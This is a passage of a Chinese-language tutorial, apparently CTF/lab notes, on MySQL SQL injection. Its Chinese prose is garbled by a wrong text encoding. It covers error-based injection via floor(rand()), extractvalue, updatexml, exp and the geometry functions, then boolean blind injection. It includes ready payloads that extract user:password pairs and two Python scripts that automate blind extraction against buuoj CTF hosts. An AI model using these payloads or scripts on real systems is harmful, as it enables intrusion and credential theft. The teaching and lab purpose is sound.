æ˜¯keyæ˜¯ä¸ªéšæœºæ•°ï¼Œæ£€æµ‹ä¸´æ—¶è¡¨ä¸­keyæ˜¯å¦å­˜åœ¨æ—¶è®¡ç®—äº†ä¸€ä¸‹floor(random(0)*2)å¯èƒ½ä¸º0ï¼Œå¦‚æœæ­¤æ—¶ä¸´æ—¶è¡¨åªæœ‰keyä¸º1çš„è¡Œä¸å­˜åœ¨keyä¸º0çš„è¡Œï¼Œé‚£ä¹ˆæ•°æ®åº“è¦å°†è¯¥æ¡è®°å½•æ’å…¥ä¸´æ—¶è¡¨ï¼Œç”±äºæ˜¯éšæœºæ•°ï¼Œæ’æ—¶åˆè¦è®¡ç®—ä¸€ä¸‹éšæœºå€¼ï¼Œæ­¤æ—¶floor(random(0)*2)ç»“æœå¯èƒ½ä¸º1ï¼Œå°±ä¼šå¯¼è‡´æ’å…¥æ—¶å†²çªè€ŒæŠ¥é”™ã€‚å³æ£€æµ‹æ—¶å’Œæ’å…¥æ—¶ä¸¤æ¬¡è®¡ç®—äº†éšæœºæ•°çš„å€¼ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=0â€™ union select 1,2,3 from(select count(*),concat((select concat(version(),â€™-â€™,database(),â€™-â€™,user()) <span class="built_in">limit</span> 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line">/*æ‹†è§£å‡ºæ¥å°±æ˜¯ä¸‹é¢çš„è¯­å¥*/</span><br><span class="line">concat((select concat(version(),â€™-â€™,database(),â€™-â€™,user()) <span class="built_in">limit</span> 0,1),floor(rand(0)*2))x</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå®é™…ä¸Šä¸å…‰ä½¿ç”¨äº†æŠ¥é”™æ³¨å…¥è¿˜æ˜¯ç”¨äº†åˆšåˆšçš„è”åˆæŸ¥è¯¢ï¼ŒåŒæ—¶è¿˜æ˜¯ä¸€ä¸ªåŒæŸ¥è¯¢çš„æŠ¥é”™æ³¨å…¥ï¼Œå½“åœ¨ä¸€ä¸ªèšåˆå‡½æ•°ï¼Œæ¯”å¦‚count()å‡½æ•°åé¢å¦‚æœä½¿ç”¨group byåˆ†ç»„è¯­å¥çš„è¯ï¼Œå°±å¯èƒ½ä¼šæŠŠæŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ä»¥é”™è¯¯çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ã€‚ä½†æ˜¯è¦å¤šæ¬¡æµ‹è¯•æ‰å¯ä»¥å¾—åˆ°æŠ¥é”™</p><p>åŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥çš„åŸç† <a href="https://blog.csdn.net/lixiangminghate/article/details/80466257%EF%BC%8Chttps://www.freebuf.com/articles/web/250376.html">https://blog.csdn.net/lixiangminghate/article/details/80466257ï¼Œhttps://www.freebuf.com/articles/web/250376.html</a></p><p>å¤§ä½“æ€è·¯å°±æ˜¯å½“åœ¨ä¸€ä¸ªèšåˆå‡½æ•°ï¼Œæ¯”å¦‚countå‡½æ•°åé¢å¦‚æœä½¿ç”¨åˆ†ç»„è¯­å¥å°±ä¼šæŠŠæŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ä»¥é”™è¯¯çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ï¼Œä½†æ˜¯å› ä¸ºéšæœºæ•°è¦æµ‹è¯•å¤šæ¬¡æ‰èƒ½å¾—åˆ°æŠ¥é”™ï¼Œä¸Šé¢æŠ¥é”™æ³¨å…¥å‡½æ•°ä¸­çš„ç¬¬ä¸€ä¸ªFloor()å°±æ˜¯è¿™ç§æƒ…å†µã€‚</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°</p><p>ç¬¬äºŒä¸ªå‚æ•° xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(â€˜anythingâ€™,concat(â€˜<span class="comment">#â€™,substring(hex((select database())),1,5))))</span></span><br></pre></td></tr></table></figure><h3 id="UPDATEXML-XML-document-XPath-string-new-value"><a href="#UPDATEXML-XML-document-XPath-string-new-value" class="headerlink" title="UPDATEXML (XML_document, XPath_string, new_value);"></a>UPDATEXML (XML_document, XPath_string, new_value);</h3><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§° æ–‡ä¸­ä¸ºDoc<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®<br>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p><p>ç”±äºupdatexmlçš„ç¬¬äºŒä¸ªå‚æ•°éœ€è¦Xpathæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸ç¬¦åˆxmlæ ¼å¼çš„è¯­æ³•ï¼Œå°±å¯ä»¥å®ç°æŠ¥é”™æ³¨å…¥äº†ã€‚</p><p>è¿™ä¹Ÿæ˜¯ä¸€ç§éå¸¸å¸¸è§çš„æŠ¥é”™æ³¨å…¥çš„å‡½æ•°ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure><h3 id="exp-x"><a href="#exp-x" class="headerlink" title="exp(x)"></a>exp(x)</h3><p>è¿”å› e çš„ x æ¬¡æ–¹,å½“ æ•°æ®è¿‡å¤§ æº¢å‡ºæ—¶æŠ¥é”™ï¼Œå³ x &gt; 709</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail=<span class="string">&#x27;) or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;</span>:<span class="string">&#x27;,password) from manage),0x7e))) as asd))--+</span></span><br></pre></td></tr></table></figure><h3 id="geometrycollection-mysql-ç‰ˆæœ¬5-5"><a href="#geometrycollection-mysql-ç‰ˆæœ¬5-5" class="headerlink" title="geometrycollection() mysql ç‰ˆæœ¬5.5"></a>geometrycollection() mysql ç‰ˆæœ¬5.5</h3><p>ï¼ˆ1ï¼‰å‡½æ•°è§£é‡Šï¼š<br>GeometryCollectionæ˜¯ç”±1ä¸ªæˆ–å¤šä¸ªä»»æ„ç±»å‡ ä½•å¯¹è±¡æ„æˆçš„å‡ ä½•å¯¹è±¡ã€‚GeometryCollectionä¸­çš„æ‰€æœ‰å…ƒç´ å¿…é¡»å…·æœ‰ç›¸åŒçš„ç©ºé—´å‚è€ƒç³»ï¼ˆå³ç›¸åŒçš„åæ ‡ç³»ï¼‰ã€‚</p><p>ï¼ˆ2ï¼‰å®˜æ–¹æ–‡æ¡£ä¸­ä¸¾ä¾‹çš„ç”¨æ³•å¦‚ä¸‹ï¼š<br>GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</p><p>ï¼ˆ3ï¼‰æŠ¥é”™åŸå› ï¼š<br>å› ä¸ºMYSQLæ— æ³•ä½¿ç”¨è¿™æ ·çš„å­—ç¬¦ä¸²ç”»å‡ºå›¾å½¢ï¼Œæ‰€ä»¥æŠ¥é”™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;) and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name=&#x27;</span>manage<span class="string">&#x27; limit 0,1)a)b)); %23</span></span><br><span class="line"><span class="string">1&#x27;</span>) and geometrycollection((select * from(select * from(select distinct concat(0x23,user,0x2a,password,0x23,name,0x23) FROM manage <span class="built_in">limit</span> 0,1)a)b)); %23</span><br><span class="line">1<span class="string">&#x27;) and geometrycollection((select * from(select * from(select version())a)b)); %23</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå’Œæˆ‘ä»¬ä¸Šé¢å­¦è¿‡çš„cancatå’Œä¸Šä¸€å…³å­¦çš„å†…ç½®è¡¨æœ‰ä¸¤ä¸ªæ¢¦å¹»è”åŠ¨</p><h3 id="multipoint-mysql-ç‰ˆæœ¬5-5"><a href="#multipoint-mysql-ç‰ˆæœ¬5-5" class="headerlink" title="multipoint() mysql ç‰ˆæœ¬5.5"></a>multipoint() mysql ç‰ˆæœ¬5.5</h3><p>ï¼ˆ1ï¼‰å‡½æ•°è§£é‡Šï¼š<br>MultiPointæ˜¯ä¸€ç§ç”±Pointå…ƒç´ æ„æˆçš„å‡ ä½•å¯¹è±¡é›†åˆã€‚è¿™äº›ç‚¹æœªä»¥ä»»ä½•æ–¹å¼è¿æ¥æˆ–æ’åºã€‚<br>â€‚<br>ï¼ˆ2ï¼‰æŠ¥é”™åŸå› ï¼š<br>åŒæ ·æ˜¯å› ä¸ºæ— æ³•ä½¿ç”¨å­—ç¬¦ä¸²ç”»å‡ºå›¾å½¢ä¸geometrycollectionç±»ä¼¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;) and multipoint((select * from(select * from(select version())a)b)); %23</span></span><br></pre></td></tr></table></figure><h3 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h3><p>polygonæ¥è‡ªå¸Œè…Šã€‚ â€œPolyâ€ æ„å‘³ â€œmanyâ€ ï¼Œ â€œgonâ€ æ„å‘³ â€œangleâ€.<br>Polygonæ˜¯ä»£è¡¨å¤šè¾¹å‡ ä½•å¯¹è±¡çš„å¹³é¢Surfaceã€‚å®ƒç”±å•ä¸ªå¤–éƒ¨è¾¹ç•Œä»¥åŠ0æˆ–å¤šä¸ªå†…éƒ¨è¾¹ç•Œå®šä¹‰ï¼Œå…¶ä¸­ï¼Œæ¯ä¸ªå†…éƒ¨è¾¹ç•Œå®šä¹‰ä¸ºPolygonä¸­çš„1ä¸ªå­”ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;</span>:<span class="string">&#x27;,password) from manage))asd)asd))--+</span></span><br></pre></td></tr></table></figure><h3 id="mutipolygon"><a href="#mutipolygon" class="headerlink" title="mutipolygon()"></a>mutipolygon()</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) or multipolygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;</span>:<span class="string">&#x27;,password) from manage))asd)asd))</span></span><br></pre></td></tr></table></figure><h3 id="linestring-ï¼‰"><a href="#linestring-ï¼‰" class="headerlink" title="linestring(ï¼‰"></a>linestring(ï¼‰</h3><p>æŠ¥é”™åŸç†ï¼š<br>mysqlçš„æœ‰äº›å‡ ä½•å‡½æ•°ï¼ˆ ä¾‹å¦‚geometrycollection()ï¼Œmultipoint()ï¼Œpolygon()ï¼Œmultipolygon()ï¼Œlinestring()ï¼Œmultilinestring() ï¼‰å¯¹å‚æ•°è¦æ±‚ä¸ºå‡ ä½•æ•°æ®ï¼Œè‹¥ä¸æ»¡è¶³è¦æ±‚åˆ™ä¼šæŠ¥é”™ï¼Œé€‚ç”¨äº5.1-5.5ç‰ˆæœ¬ (5.0.ä¸­å­˜åœ¨ä½†æ˜¯ä¸ä¼šæŠ¥é”™)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;) and linestring((select * from(select * from(select database())a)b))--+;</span></span><br></pre></td></tr></table></figure><h3 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h3><p>åŒä¸Š</p><h3 id="ST-LatFromGeoHash-ï¼ˆmysql-gt-x3D-5-7-xï¼‰"><a href="#ST-LatFromGeoHash-ï¼ˆmysql-gt-x3D-5-7-xï¼‰" class="headerlink" title="ST.LatFromGeoHash()ï¼ˆmysql&gt;&#x3D;5.7.xï¼‰"></a>ST.LatFromGeoHash()ï¼ˆmysql&gt;&#x3D;5.7.xï¼‰</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) or ST_LatFromGeoHash((select * from(select * from(select (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;</span>:<span class="string">&#x27;,password) from manage),0x7e))))a)b))--+</span></span><br></pre></td></tr></table></figure><h3 id="ST-LongFromGeoHash"><a href="#ST-LongFromGeoHash" class="headerlink" title="ST.LongFromGeoHash"></a>ST.LongFromGeoHash</h3><p>åŒä¸Š åµŒå¥—æŸ¥è¯¢</p><h3 id="ST-Pointfromgeohash-mysql-gt-5-7"><a href="#ST-Pointfromgeohash-mysql-gt-5-7" class="headerlink" title="ST_Pointfromgeohash (mysql&gt;5.7)"></a>ST_Pointfromgeohash (mysql&gt;5.7)</h3><p>è·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;)or  ST_PointFromGeoHash(version(),1)--+</span></span><br><span class="line"><span class="string">&#x27;</span>)or  ST_PointFromGeoHash((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),1)--+</span><br><span class="line"><span class="string">&#x27;)or  ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;</span>manage<span class="string">&#x27; limit 0,1),1)--+</span></span><br><span class="line"><span class="string">&#x27;</span>)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,<span class="string">&#x27;:&#x27;</span>,`password`) from manage),0x23)),1)--+</span><br></pre></td></tr></table></figure><h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p>SQL Injectionï¼ˆBlindï¼‰ï¼Œå³SQLç›²æ³¨ï¼Œä¸ä¸€èˆ¬æ³¨å…¥çš„åŒºåˆ«åœ¨äºï¼Œä¸€èˆ¬çš„æ³¨å…¥æ”»å‡»è€…å¯ä»¥ç›´æ¥ä»é¡µé¢ä¸Šçœ‹åˆ°æ³¨å…¥è¯­å¥çš„æ‰§è¡Œç»“æœï¼Œè€Œç›²æ³¨æ—¶æ”»å‡»è€…é€šå¸¸æ˜¯æ— æ³•ä»æ˜¾ç¤ºé¡µé¢ä¸Šè·å–sqlè¯­å¥çš„æ‰§è¡Œç»“æœï¼Œç”šè‡³è¿æ³¨å…¥è¯­å¥æ˜¯å¦æ‰§è¡Œéƒ½æ— ä»å¾—çŸ¥ï¼Œå› æ­¤ç›²æ³¨çš„éš¾åº¦è¦æ¯”ä¸€èˆ¬æ³¨å…¥é«˜ã€‚ç›®å‰ç½‘ç»œä¸Šç°å­˜çš„SQLæ³¨å…¥æ¼æ´å¤§å¤šæ˜¯SQLç›²æ³¨ã€‚</p><p>å¯¹äºåŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼Œå¯é€šè¿‡æ„é€ çœŸorå‡åˆ¤æ–­æ¡ä»¶ï¼ˆæ•°æ®åº“å„é¡¹ä¿¡æ¯å–å€¼çš„å¤§å°æ¯”è¾ƒï¼Œ å¦‚ï¼šå­—æ®µé•¿åº¦ã€ç‰ˆæœ¬æ•°å€¼ã€å­—æ®µåã€å­—æ®µåå„ç»„æˆéƒ¨åˆ†åœ¨ä¸åŒä½ç½®å¯¹åº”çš„å­—ç¬¦ASCIIç â€¦ï¼‰ï¼Œ å°†æ„é€ çš„sqlè¯­å¥æäº¤åˆ°æœåŠ¡å™¨ï¼Œç„¶åæ ¹æ®æœåŠ¡å™¨å¯¹ä¸åŒçš„è¯·æ±‚è¿”å›ä¸åŒçš„é¡µé¢ç»“æœ ï¼ˆTrueã€Falseï¼‰ï¼›ç„¶åä¸æ–­è°ƒæ•´åˆ¤æ–­æ¡ä»¶ä¸­çš„æ•°å€¼ä»¥é€¼è¿‘çœŸå®å€¼ï¼Œç‰¹åˆ«æ˜¯éœ€è¦å…³æ³¨å“åº”ä»True&lt;â€“&gt;Falseå‘ç”Ÿå˜åŒ–çš„è½¬æŠ˜ç‚¹ã€‚</p><h3 id="ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†"><a href="#ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†" class="headerlink" title="ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†"></a>ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†</h3><p>ä¼šç”¨åˆ°æˆªå–å­—ç¬¦çš„å‡½æ•°ï¼šsubstr()<br>å¯ä»¥ç›´æ¥åˆ¤æ–­å­—ç¬¦æˆ–è€…æ ¹æ®ASCIIç æ¥åˆ¤æ–­ï¼Œåˆ©ç”¨ASCIIç æ—¶è¦ç”¨åˆ°ASCII()å‡½æ•°æ¥å°†å­—ç¬¦è½¬æ¢ä¸ºASCIIç å€¼ã€‚<br>è¿˜ç”¨åˆ°äº†å„ç§è¿ç®—ç¬¦ï¼Œ&lt;ï¼Œ&gt;ï¼Œ&#x3D;å½“ç„¶ä¸å¿…å¤šæï¼Œä½†æ˜¯åœ¨ä¸‹é¢POSTçš„æ–¹å¼ä¸­ç”¨åˆ°äº†å¼‚æˆ–ç¬¦å·^ï¼Œè¿™é‡Œå…¶å®æ˜¯ä¸€ç§å¼‚æˆ–æ³¨å…¥çš„æ–¹æ³•ï¼Œå½“æˆ‘ä»¬åœ¨å°è¯•SQLæ³¨å…¥æ—¶,å‘ç°union,andè¢«å®Œå…¨è¿‡æ»¤æ‰äº†,å°±å¯ä»¥è€ƒè™‘ä½¿ç”¨å¼‚æˆ–æ³¨å…¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¼‚æˆ–è¿ç®—è§„åˆ™:</span><br><span class="line">1^1=0 0^0=0 0^1=1</span><br><span class="line">1^1^1=0 1^1^0=0</span><br><span class="line">æ„é€ payload:<span class="string">&#x27;^ascii(mid(database(),1,1)=98)^0</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œä¼šå¤šåŠ ä¸€ä¸ª^0æˆ–1æ˜¯å› ä¸ºåœ¨ç›²æ³¨çš„æ—¶å€™å¯èƒ½å‡ºç°äº†è¯­æ³•é”™è¯¯ä¹Ÿæ— æ³•åˆ¤æ–­,è€Œæ”¹å˜è¿™é‡Œçš„0æˆ–1,å¦‚æœè¿”å›çš„ç»“æœæ˜¯ä¸åŒçš„,é‚£å°±å¯ä»¥è¯æ˜è¯­æ³•æ˜¯æ²¡æœ‰é—®é¢˜çš„.</p><h3 id="æ³¨å…¥æµç¨‹"><a href="#æ³¨å…¥æµç¨‹" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h3><p>é¦–å…ˆé€šè¿‡é¡µé¢å¯¹äºæ°¸çœŸæ¡ä»¶or 1&#x3D;1 ä¸æ°¸å‡æ¡ä»¶ and 1&#x3D;2 çš„è¿”å›å†…å®¹æ˜¯å¦å­˜åœ¨å·®å¼‚è¿›è¡Œåˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œå¸ƒå°”ç›²æ³¨ã€‚</p><p>ä¸‹é¢ç»™å‡ºå¸¸ç”¨çš„å¸ƒå°”ç›²æ³¨è„šæœ¬ã€‚</p><ul><li><p>GETå‹æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/&#x27;</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;       <span class="comment"># å¦‚æœç›®æ ‡ç½‘ç«™è¦äº‹å…ˆç™»å½•ï¼Œå°±åŠ ä¸Šcookieså§</span></span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;c8ab8r49nd2kk0qfhs0dcaktl3&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">90000</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">       payload = <span class="string">&quot;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=0&#x27; or ascii(substr(database(),%d,1))&gt;%d-- &quot;</span> %(i,mid)    <span class="comment"># æ³¨æ„getå‹çš„æ³¨å…¥æ³¨é‡Šç¬¦è¦ç”¨--ç©ºæ ¼</span></span><br><span class="line">       res = requests.get(url=payload)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> res.text:      <span class="comment"># ä¸ºçœŸæ—¶ï¼Œå³åˆ¤æ–­æ­£ç¡®çš„æ—¶å€™çš„æ¡ä»¶</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></li><li><p>POSTå‹æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://81689af7-4cd5-432c-a88e-f5113e16c7c1.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">250</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">       <span class="comment">#payload = &#x27;http://d63d924a-88e3-4036-b463-9fc6a00f4fef.node3.buuoj.cn/search.php?id=1^(ascii(substr(database(),%d,1))=%d)#&#x27; %(i,mid)</span></span><br><span class="line">       payload = <span class="string">&quot;0^(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)#&quot;</span> %(i,mid)</span><br><span class="line">       datas = &#123;</span><br><span class="line">                     <span class="string">&quot;id&quot;</span>:payload</span><br><span class="line">                &#125;</span><br><span class="line">       res = requests.post(url=url,data=datas)</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;girlfriend&#x27;</span> <span class="keyword">in</span> res.text:      <span class="comment"># ä¸ºçœŸæ—¶ï¼Œå³åˆ¤æ–­æ­£ç¡®çš„æ—¶å€™çš„æ¡ä»¶</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></li></ul><p>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆåˆ†æè„šæœ¬çš„æ€è·¯ï¼Œè„šæœ¬åˆ©ç”¨äº†requeståº“æ¥å‘é€è¯·æ±‚ï¼ŒåŒæ—¶å®šä¹‰äº†ä¸€ä¸ªflagå­—ç¬¦ä¸²ç”¨æ¥å‚¨å­˜flagã€‚ç„¶åå†™äº†ä¸€ä¸ªforå¾ªç¯ï¼Œå°é¡¶è·‘250éï¼Œç„¶åå®šä¹‰äº†lowå’Œhighï¼Œè¿™é‡Œæ ¹æ®çš„æ˜¯ASCIIç ä¸­çš„æ‰“å°å­—ç¬¦ï¼Œå®šä¹‰äº†ä¸­é—´å€¼ï¼Œå› ä¸ºä¸€ä¼šå„¿è¦ä½¿ç”¨çš„æ˜¯äºŒåˆ†æ³•ï¼Œå½“low&lt;highæ—¶è¿›å…¥whileå¾ªç¯ï¼Œæ‰§è¡Œpayloadæ˜¯å¦å¤§äºmidçš„åˆ¤æ–­ï¼Œè¿™é‡ŒGETå’ŒPOSTç•¥æœ‰åŒºåˆ«ï¼ŒGETä¼ å…¥çš„é”®å€¼å¯¹ï¼Œåˆ©ç”¨requests.postæ–¹æ³•è¿›è¡Œè¯·æ±‚ï¼ŒGETç›´æ¥æŠŠPayloadæ‹¼æ¥åœ¨urlåé¢è¿›è¡Œrequests.getæ–¹æ³•å³å¯ï¼Œç„¶åæ ¹æ®æˆ‘ä»¬åˆ¤æ–­çœŸå‡çš„æ–¹å¼å†™ä¸€ä¸ªifå¾ªç¯ï¼Œè¿™é‡Œçš„res.textæ˜¯è¿”å›æ•°æ®ï¼Œå¯ä»¥å…ˆå†™ä¸ªç®€å•è„šæœ¬çœ‹ä¸€ä¸‹è¯¥æ€ä¹ˆä»å…¶ä¸­åˆ¤æ–­çœŸå‡ï¼Œå¦‚æœä¸ºçœŸlow&#x3D;mid+1ï¼Œç„¶åå†å–ä¸­é—´å€¼ï¼Œå¦‚æœä¸ºå‡åˆ™high&#x3D;midç„¶åå–ä¸­é—´å€¼ï¼Œç›´åˆ°lowå¤§äºhighå°±èƒ½ç¡®å®šå‡ºè¯¥ä½ç½®çš„ASCIIç äº†ï¼Œç„¶åæœ€ä¸‹é¢çš„ifå¾ªç¯æ˜¯æ’é™¤æ‰åœ¨ä¸¤ç«¯çš„ç‰¹æ®Šæƒ…å†µï¼Œç„¶åæ¯æ¬¡å¾ªç¯æ‰“å°ä¸€æ¬¡flagï¼Œæœ‰æ—¶å€™å¯èƒ½è¿˜è¦è®¾ç½®å»¶æ—¶ï¼Œè¿™é‡Œæ²¡æœ‰ç®¡ã€‚</p><p>åˆ©ç”¨å¼‚æˆ–çš„ï¼š</p><figure class="highlight 